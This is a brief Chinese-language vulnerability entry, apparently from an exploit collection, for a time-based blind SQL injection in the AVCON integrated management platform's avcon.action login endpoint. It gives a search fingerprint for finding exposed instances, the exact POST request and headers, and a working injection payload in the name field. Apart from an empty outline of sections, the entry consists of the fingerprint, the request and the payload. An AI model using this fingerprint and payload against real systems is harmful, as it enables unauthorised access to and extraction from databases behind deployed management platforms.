# avcon综合管理平台avcon.action存在SQL注入漏洞

- **系统**：avcon　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`title="AVCON-系统管理平台"`
- **请求**：`POST /avcon.action HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Content-Type: application/x-www-form-urlencoded`　`Content-Length: 77`

**请求体 / payload**
```
name=0'XOR(if(now()=sysdate()%2Csleep(6)%2C0))XOR'Z&password=u]Hww6KrA9F.x-F
```

**其他**
- avcon综合管理平台avcon.action存在SQL注入漏洞: * [一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * avcon综合管理平台